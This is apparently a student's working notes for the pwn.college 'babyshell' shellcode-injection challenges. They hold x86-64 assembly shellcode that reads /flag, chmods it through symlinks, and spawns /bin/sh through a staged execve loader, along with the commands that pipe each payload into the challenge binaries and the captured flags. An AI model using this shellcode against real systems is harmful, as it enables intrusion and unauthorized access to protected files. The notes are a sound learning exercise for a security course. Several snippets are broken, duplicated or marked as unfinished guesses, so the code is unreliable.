# ssh -i key hacker@dojo.pwn.college

# open.s file
.intel_syntax noprefix
mov BYTE PTR [rsp], '/'
mov BYTE PTR [rsp+1], 'e'
mov BYTE PTR [rsp+2], 't'
mov BYTE PTR [rsp+3], 'c'
mov BYTE PTR [rsp+4], '/'
mov BYTE PTR [rsp+5], 'p'
mov BYTE PTR [rsp+6], 'a'
mov BYTE PTR [rsp+7], 's
mov BYTE PTR [rsp+8], 's'
mov BYTE PTR [rsp+9], 'w'
mov BYTE PTR [rsp+10], 'd'
mov BYTE PTR [rsp+11], '0'
mov rax, 2
mov rdi, rsp
mov rsi, 0
syscall

# s file open, read and write base
.global _start
.intel_syntax noprefix
_start:
    # open files
    mov rsi, 0
    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rax, 2              #syscall 2 opens file
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
    syscall

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
    syscall

    #exit
    mov rax, 60
    mov rax, 42
    syscall

#\0 is null terminating for strings
flag:
    .ascii "/flag\0"

# alternative flag opening
.global _start
.intel_syntax noprefix
_start:
    
    mov rbx, 0x67616c662f   # file location?
    push rbx                # puts flag on stack


    #open files
    mov rsi, 0
    #lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rdi, rsp
    mov rax, 2              #syscall 2 opens file
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
    syscall

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
    syscall

    #exit
    mov rax, 60
    mov rax, 42
    syscall

#\0 is null terminating for strings
#flag:
    #.ascii "/flag\0"


# python to shell
#!/usr/bin/env python3
from pwn import *

context.arch='x86-64'

my_string = "hello"

my_long_string = """
    line 1
    line 2
    line 3
    """

my_shellcode = asm("""
    mov rdi, 42
    mov ax, 60
    syscall
    """)

with open('/tmp/sc_from_python_land', 'wb') as f:
    f.write(my_shellcode)

#p = gdb.debug('/challenge/babyshell_level1')

p.send(my_shellcode)

p.interactive

# 1
# s file
.global _start
.intel_syntax noprefix
_start:
    # open files
    mov rsi, 0
    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rax, 2              #syscall 2 opens file
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
    syscall

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
    syscall

    #exit
    mov rax, 60
    mov rax, 42
    syscall

#\0 is null terminating for strings
flag:
    .ascii "/flag\0"

gcc -nostdlib -o solve.elf shell1.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level1

pwn.college{wFFhDj-LQu_ObeVAAXX_G4tLeMm.QX3EjMscTOxUzW}


# chmod solution flag 1
.global _start
.intel_syntax noprefix
_start:
        # call chmod on /flag

        # set first arg to path name -> is char pointer need address
        # first argument is in RDI
        #lea rdi, [rip + _flag_addr]

        # alternate 
        #puts flag value on stack and pushes the stack pointer and places it into rdi
        # 46 -> F , 5A -> Z -> 90
        #mov rcx, 0x46
        push rcx
        push rsp
        pop rdi
        # set 2nd arg mode to something
        # 2nd argument is in RDI
        mov rsi, 4

        # call chmod
        # perform a syscall
        # value in rax determines which syscall occurs
        mov rax, 90
        syscall

_flag_addr:
        .ascii "/flag"

gcc -nostdlib -o solve.elf shell1_chmod.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level1

gcc -nostdlib -o solve.elf schmod.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

# 2
# s file
.global _start
.intel_syntax noprefix
_start:

    .rept 800
    nop
    .endr
    # open files
    mov rsi, 0
    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rax, 2              #syscall 2 opens file
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
    syscall

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
    syscall

    #exit
    mov rax, 60
    mov rax, 42
    syscall

#\0 is null terminating for strings
flag:
    .ascii "/flag\0"

gcc -nostdlib -o solve.elf shell2.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level2

pwn.college{ctuc6WBDiBbuJHYb9_Qee11fFzj.QX4EjMscTOxUzW}


# 3 no null bytes -> 00
.global _start
.intel_syntax noprefix
_start:
    # open files
    xor rsi, rsi
    mov BYTE PTR [rsp], '/'
    mov BYTE PTR [rsp+1], 'f'
    mov BYTE PTR [rsp+2], 'l'
    mov BYTE PTR [rsp+3], 'a'
    mov BYTE PTR [rsp+4], 'g'
    xor cl, cl 
    mov BYTE PTR [rsp+5], cl
    mov rdi, rsp
    xor rax, rax
    mov al, 2              #syscall 2 opens file -> was rax, al will result in no null bytes
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    xor rdx, rdx
    mov dl, 100    # reads 100 bytes -> changed for no null bytes
    xor rax, rax
    syscall

    #write files
    xor rdi, rdi
    mov dil, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    xor rax, rax
    mov al, 1	    # could be inc rax also
    syscall

    #exit
    xor rax, rax
    mov al, 60
    xor rdi, rdi
    mov al, 42
    syscall


gcc -nostdlib -o solve.elf shell3.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level3

pwn.college{8vDVbOV8ZUKqYqz6PXzS0HrV3IS.QX5EjMscTOxUzW}

# 4 no h bytes -> 48 close just need file reading
# s file -> almost done solution
.global _start
.intel_syntax noprefix
_start:
    # open files
    mov esi, 0
    mov BYTE PTR [rsp], 'f'
    xor cl, cl 
    mov BYTE PTR [rsp+1], cl
    mov edi, esp
    mov eax, 2              //syscall 2 opens file
    syscall

    #read files
    mov edi, eax    //file saved in rax from above syscall
    mov esi, esp    //move file to readable register
    mov edx, 100    // reads 100 bytes
    mov eax, 0
    syscall

    #write files
    mov edi, 1      //write to stdout
    mov esi, esp    //moves file to write 
    mov edx, eax    //reads # of bytes to write
    mov eax, 1
    syscall

    #exit
    mov eax, 60
    mov edi, 42
    syscall

# 4 -> actual solution
# s file
global _start
.intel_syntax noprefix
_start:

    # load path Z to register
        #xor rcx, rcx
        mov ecx, 0x5A       # symlink to Z cl -> rcx
        push rcx
        push rsp            # RSP stack pointer
        pop rdi

        mov sil, 0x7          # set perm to 4
        mov al, 90          # chmod syscall
        syscall



gcc -nostdlib -o solve.elf schmod2.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level4
pwn.college{IbsuuBQcoJEqyJ_QDc5c47Aorl0.QXwIjMscTOxUzW}


# 5
.global _start
.intel_syntax noprefix
_start:
    #fix up our syscalls
    mov byte ptr [rip+syscall1], 0x0f
    mov byte ptr [rip+syscall1+1], 0x05
    mov byte ptr [rip+syscall2], 0x0f
    mov byte ptr [rip+syscall2+1], 0x05
    mov byte ptr [rip+syscall3], 0x0f
    mov byte ptr [rip+syscall3+1], 0x05

    # open files
    mov rsi, 0
    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rax, 2              #syscall 2 opens file
syscall1:
    .byte 0x13
    .byte 0x37

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
syscall2:
    .byte 0x13
    .byte 0x37

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
syscall3:
    .byte 0x13
    .byte 0x37

    #exit
    mov rax, 60
    mov rax, 42
syscall4:
    .byte 0x13
    .byte 0x37

#\0 is null terminating for strings
flag:cat solve.bin | /challenge/babyshell_level6

gcc -nostdlib -o solve.elf shell5.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level5

pwn.college{AtdbB36V5Z-bC81puuNGpZg0QuS.QXxIjMscTOxUzW}

# 6
.global _start
.intel_syntax noprefix
_start:
    .rept 4096
    nop
    .endr
    #fix up our syscalls
    mov byte ptr [rip+syscall1], 0x0f
    mov byte ptr [rip+syscall1+1], 0x05
    mov byte ptr [rip+syscall2], 0x0f
    mov byte ptr [rip+syscall2+1], 0x05
    mov byte ptr [rip+syscall3], 0x0f
    mov byte ptr [rip+syscall3+1], 0x05

    # open files
    mov rsi, 0
    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rax, 2              #syscall 2 opens file
syscall1:
    .byte 0x13
    .byte 0x37

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
syscall2:
    .byte 0x13
    .byte 0x37

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
syscall3:
    .byte 0x13
    .byte 0x37

    #exit
    mov rax, 60
    mov rax, 42
syscall4:
    .byte 0x13
    .byte 0x37

#\0 is null terminating for strings
flag:
    .ascii "/flag\0"


gcc -nostdlib -o solve.elf shell6.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level6

pwn.college{U9daynYJnepLdAJU-nWLYoGWVgR.QXyIjMscTOxUzW}

# 7

.global _start
.intel_syntax noprefix
_start:

    # load path Z to register  
    xor rcx, rcx
    mov cl, 0x5A       # symlink to Z cl -> rcx
	push rcx            
	push rsp            # RSP stack pointer
	pop rdi

   	mov sil, 0x7          # set perm to 4
    mov al, 90          # chmod syscall
	syscall

gcc -nostdlib -o solve.elf shellchmod3.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

pwn.college{YvvQpWzaXS-2QeDcFbjRXlFSsuE.QXzIjMscTOxUzW}


# 8 -> 10 ->11 solves
# 8
.global _start
.intel_syntax noprefix
_start:

    # load path Z to register  
    xor rcx, rcx
    mov cl, 0x5A       # symlink to Z cl -> rcx
	push rcx            
	push rsp            # RSP stack pointer
	pop rdi

   	mov sil, 0x7          # set perm to 4
    mov al, 90          # chmod syscall
	syscall

gcc -nostdlib -o solve.elf shellchmod3.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

run cat Z
pwn.college{A_y2Yv8-W_AN4clyzzCpt_2Cv-S.QX0IjMscTOxUzW}


# 9
.global _start
.intel_syntax noprefix
_start:

    # load path Z to register
    	xor rcx, rcx	 # 2 bytes
	mov cl, 0x5A     # symlink to Z -> 2 bytes
	push rcx	 # 1 byte
	push rsp	 # 1 byte

	# jmp here
	jmp loop	 # at 9 bytes

   	.rept 12
	nop
	.endr
loop:
	pop rdi
	mov sil, 7          # set perm to 4
    	mov al, 90         # chmod syscall
	syscall

gcc -nostdlib -o solve.elf shellchmod9.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

pwn.college{kqV1J90sx9XiJzjjWAYxpYvBbeX.QX1IjMscTOxUzW}

# 10
# s file
.global _start
.intel_syntax noprefix
_start:

    # load path f to register
    xor rcx, rcx
	mov cl, 0x5A     # symlink to Z
	push rcx
	push rsp
	pop rdi

   	mov sil, 7          # set perm to 4
    mov al, 90         # chmod syscall
	syscall

gcc -nostdlib -o solve.elf shellchmod3.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*
pwn.college{c5iFhV9y_gBxmt_B7rhrEF_fvUv.QX2IjMscTOxUzW}

# 11
# s file shellchmod3.s
 # load path f to register
    xor rcx, rcx
	mov cl, 0x5A     # symlink to Z
	push rcx
	push rsp
	pop rdi

   	mov sil, 7          # set perm to 4
    mov al, 90         # chmod syscall
	syscall

gcc -nostdlib -o solve.elf shellchmod3.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*
pwn.college{8iBRHMjHGTdon1EduVvtaKd2nYe.QX3IjMscTOxUzW}


# 12
# s file
.global _start
.intel_syntax noprefix
_start:

    # load path f to register
    xor rcx, rcx
	mov cl, 0x46     # symlink to Z
	push rcx
	push rsp
	pop rdi

   	mov sil, 7          # set perm to 4
    mov al, 90         # chmod syscall
#	and al, 90
	syscall



gcc -nostdlib -o solve.elf shellchmod12.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*
pwn.college{c9Bcqy0Vt5tKNSxTSQ1QcyYLwIz.QX4IjMscTOxUzW}

# 13
# stage1 
.global _start
_start:
.intel_syntax noprefix
	xor rax, rax
	xor rdi, rdi			#stdin is fd 0
	#lea rsi, [rip+where_to_read] 	#read into 
    
    mov cl 0x46         # 46 -> F
    push rcx            #changed for smaller read
    push rsp
    pop rdi
	
    mov rdx, 1024 			#buf -> how much to read
	syscall #triggers syscall


where_to_read:
	.ascii "F"
	nop


gcc -nostdlib -o solve.elf shellstage1.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level13




mov al, 90
syscall

gcc -nostdlib -o solve.elf shell13.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level13


# 14
lea esi, [rdx]
push rax
pop rdi
syscall

# office hours
# s file
.global _start
.intel_syntax noprefix
_start:
#set rdi to 0 (for stdin) -> try setting rdi to 0 with less bytes
xor rdi, rdi

#set rsi to some mem location -> rdx -> can get rdx to 3 bytes
mov rsi, rdx
syscall


# file 2
.rept 100; nop; .endr
push rsp
mov rax, 1
mov rbx, 2

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~END OF SOLUTIONS -> NOTES AND SOLUTIONS~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# office hours staging
# stage1.s
.global _start
_start:
.intel_syntax noprefix
	mov rax, 0
	mov rdi, 0 			#stdin is fd 0
	lea rsi, [rip+where_to_read] 	#read into 
	mov rdx, 1024 			#buf -> how much to read
	syscall #triggers syscall
where_to_read:
	#.string "/bin/sh"
	nop


#stage2.s
.global _start
_start:
.intel_syntax noprefix
    mov rax, 59
    lea rdi, [rip+binsh]
    mov rsi, 0
    mov rdx, 0
    syscall
binsh:
    .string "/bin/sh"

gcc -nostdlib -static -o stage1 stage1.s
gcc -nostdlib -static -o stage2 stage2.s
objcopy --dump-section .text=stage2-raw stage2
objcopy --dump-section .text=stage1-raw stage1

#lets us run ./stage1 < stage2-raw
gcc -Wl,-N -nostdlib -static -o stage1 stage1.s

strace ./stage1 < stage2-raw

gdb stage1
break _start
r < stage2-raw
x/i $rip
si
x/i $rip
si
info reg




# Different debugging stuff
strace ./solve.elf
gdb ./solve.elf
    starti
    info proc map
    disp/5i $rip
    si

# see where challenge fails
cat solve.bin | strace /challenge/babyshell_level6

===========================================================================
# office hours Chmod 

#chmod solution with Z
.global _start
.intel_syntax noprefix
_start:

    # load path f to register
    mov rcx, 0x5A     # symlink to Z
	push rcx
	push rsp
	pop rdi

   	mov rsi, 0x7          # set perm to 7
    mov rax, 90         # chmod syscall
	syscall
_flag_addr:
	.ascii "/flag"

gcc -nostdlib -o solve.elf shellchmod.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

# alt chmod solution
.global _start
.intel_syntax noprefix
_start:

    lea rdi, [rip + _flag_addr]    # symlink to x?
	push rsp
	pop rdi

   	mov rsi, 7          # set perm to 4
    mov rax, 90         # chmod syscall
	syscall

_flag_addr:
	.ascii "/flag"

gcc -nostdlib -o solve.elf shellchmod2.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*


#chmodding flag
mov rbx, 0x00000067616c662f  # /flag
push rbx
push rsp   # very cool - takes only one byte
pop rdi
push 7  #rwx permissions
pop rsi
mov al, 90
syscall

# smaller chmodding Z
.global _start
.intel_syntax noprefix
_start:

    # load path f to register
    mov ecx, 0x5A     # symlink to Z
	push rcx            # 2nd 
	push rsp
	pop rdi

   	mov esi, 0x7          # set perm to 4 -> 2nd arg rsi -> esi
    mov eax, 90         # chmod syscall -> first arg rax -> eax
	syscall

gcc -nostdlib -o solve.elf shellchmod4.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

===========================================================================

# symlink a to flag
push 0x61  # "a" string
push rsp   # very cool - takes only one byte!
pop rdi
push 7
pop rsi
mov al, 90
syscall

# symlink a to bash
push 0x61
push rsp   # very cool - takes only one byte!
pop rdi  # points towards "a", symlink to "/bin/sh"
xor rsi, rsi

mov al, 59
cdq  # reset rdx within a single byte!

syscall


=======================================================================
# chmod in 6 bytes?
xor eax, eax
mov al, 0x5A
syscall


gcc -nostdlib -o solve.elf chmod2.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

=======================================================================

# stack overflow chmod
mov al, 15
mov ebx, 0x5a
syscall

gcc -nostdlib -o solve.elf chmod3.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

=======================================================================
# Random possible solutions to look at 

# exit syscall in 6 bytes
xor eax, eax    # 2 bytes
mov al, 60      # exit syscall -> 60(3c) 2 bytes
syscall         # 2 bytes 


# 5 BYTE SOLUTION?
mov al, 90
movsb
syscall
# Other random solution
push rcx 
pop rdi
syscall

gcc -nostdlib -o solve.elf shellt.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*


# CHMOD solutions?
.intel_syntax noprefix
xor esi, esi
mov cl, 0x7a
xor ch, ch
mov word ptr [rsp], cx
pop rdi
mov sil, 0x1f
mov al, 0x5a
syscall

gcc -nostdlib -o solve.elf chmod.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*


# another attempt
pop rsi
pop rdi

gcc -nostdlib -o solve.elf shellTester.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

# random solution?
xor esi, esi
and eax, esi
mov si, 6
push 0x65
pop [rdi]
mov al, 0x5a
syscall

gcc -nostdlib -o solve.elf shellTest.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

# other solution
mov byte ptr[rsp], 'Z'
xor cl, cl
mov byte ptr, cl
push rsp
pop rdi

===========================================================================


# Different debugging stuff
strace ./solve.elf
gdb ./solve.elf
    starti
    info proc map
    disp/5i $rip
    si

# see where challenge fails
cat solve.bin | strace /challenge/babyshell_level6

===========================================================================
# office hours Chmod 

#chmod solution with Z
.global _start
.intel_syntax noprefix
_start:

    # load path f to register
    mov rcx, 0x5A     # symlink to Z
	push rcx
	push rsp
	pop rdi

   	mov rsi, 0x7          # set perm to 7
    mov rax, 90         # chmod syscall
	syscall
_flag_addr:
	.ascii "/flag"

gcc -nostdlib -o solve.elf shellchmod.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

# alt chmod solution
.global _start
.intel_syntax noprefix
_start:

    lea rdi, [rip + _flag_addr]    # symlink to x?
	push rsp
	pop rdi

   	mov rsi, 7          # set perm to 4
    mov rax, 90         $ chmod syscall
	syscall

_flag_addr:
	.ascii "/flag"

gcc -nostdlib -o solve.elf shellchmod2.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

# chmod using lea and /flag
.global _start
.intel_syntax noprefix
_start:

    lea rdi, [rip + _flag_addr]    # symlink to x?
   	mov rsi, 7          # set perm to 4
    mov rax, 90         $ chmod syscall
	syscall

_flag_addr:
	.ascii "/flag"


gcc -nostdlib -o solve.elf shellchmodlea.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

#chmodding flag
mov rbx, 0x00000067616c662f  # /flag
push rbx
push rsp   # very cool - takes only one byte
pop rdi
push 7  #rwx permissions
pop rsi
mov al, 90
syscall

# smaller chmodding Z
.global _start
.intel_syntax noprefix
_start:

    # load path f to register
    mov ecx, 0x5A     # symlink to Z
	push rcx            # 2nd 
	push rsp
	pop rdi

   	mov esi, 0x7          # set perm to 4 -> 2nd arg rsi -> esi
    mov eax, 90         # chmod syscall -> first arg rax -> eax
	syscall

gcc -nostdlib -o solve.elf shellchmod3.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level*

===========================================================================




# symlink a to flag
push 0x61  # "a" string
push rsp   # very cool - takes only one byte!
pop rdi
push 7
pop rsi
mov al, 90
syscall

# symlink a to bash
push 0x61
push rsp   # very cool - takes only one byte!
pop rdi  # points towards "a", symlink to "/bin/sh"
xor rsi, rsi


mov al, 59
cdq  # reset rdx within a single byte!

syscall


strace ./solve.elf
gdb ./solve.elf
    starti
    info proc map
    disp/5i $rip
    si